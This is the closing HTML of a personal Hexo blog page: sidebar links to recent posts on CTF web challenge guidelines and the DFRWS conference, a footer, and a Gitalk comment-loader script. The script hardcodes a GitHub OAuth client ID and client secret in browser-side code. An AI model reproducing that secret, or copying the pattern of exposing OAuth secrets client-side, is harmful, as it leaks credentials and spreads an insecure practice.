href="/2022/10/07/Web%E5%87%BA%E9%A2%98%E8%A7%84%E8%8C%83%E8%A7%81%E9%99%84%E4%BB%B6/" title="Web(php)出题规范见附件"><img src="https://img-blog.csdnimg.cn/d3672ed1fa0f41a88ce65f76e5a8b8f1.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web(php)出题规范见附件"/></a><div class="content"><a class="title" href="/2022/10/07/Web%E5%87%BA%E9%A2%98%E8%A7%84%E8%8C%83%E8%A7%81%E9%99%84%E4%BB%B6/" title="Web(php)出题规范见附件">Web(php)出题规范见附件</a><time datetime="2022-10-06T16:00:00.000Z" title="发表于 2022-10-07 00:00:00">2022-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%A1%B6%E4%BC%9A%E7%9A%84%E6%84%9F%E5%8F%97%E4%B9%8BDFRWS/" title="第一次参加顶会之DFRWS"><img src="https://xinyuan-1308133958.cos.ap-beijing.myqcloud.com/image-20220929183211394.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第一次参加顶会之DFRWS"/></a><div class="content"><a class="title" href="/2022/09/29/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8F%82%E5%8A%A0%E9%A1%B6%E4%BC%9A%E7%9A%84%E6%84%9F%E5%8F%97%E4%B9%8BDFRWS/" title="第一次参加顶会之DFRWS">第一次参加顶会之DFRWS</a><time datetime="2022-09-28T16:00:00.000Z" title="发表于 2022-09-29 00:00:00">2022-09-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 鑫缘</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>function addGitalkSource () {
+  const ele = document.createElement('link')
+  ele.rel = 'stylesheet'
+  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
+  document.getElementsByTagName('head')[0].appendChild(ele)
+}
+
+function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '4d4ce5b3f76f792bdfeb',
+      clientSecret: '8ac446a390aaa101275b309e475ee975a3e56751',
+      repo: 'blog',
+      owner: 'xinyuan-404',
+      admin: ['xinyuan-404'],
+      id: 'd0af1506264198d7d6f5dce4e899fc7e',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    addGitalkSource()
+    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !true) {
+  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
